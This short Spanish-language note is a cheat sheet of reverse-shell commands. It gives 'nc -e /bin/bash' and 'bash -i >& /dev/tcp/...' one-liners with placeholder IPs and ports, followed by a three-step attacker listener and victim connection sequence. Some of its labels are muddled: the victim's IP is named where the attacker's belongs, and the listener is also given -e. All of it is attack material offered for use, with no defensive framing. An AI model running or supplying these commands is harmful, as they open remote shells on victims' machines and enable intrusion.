

nc -e /bin/bash XXX.XXX.XXX.XXX XXX (ip y puerto de la victima)

bash -i >& /dev/tcp/XXX.XXX.XXX.XXX/XXX 0>&1 (ip y puerto de la victima)

1-Atacante / te pones en modo escucha
nc -nlvp XXX (puerto temporal) -e /bin/bash 

2-Victima
nc -e /bin/bash XXX.XXX.XXX.XXX XXX (ip y puerto de la victima)

3-Atacante
Conectado! A empezar a escribir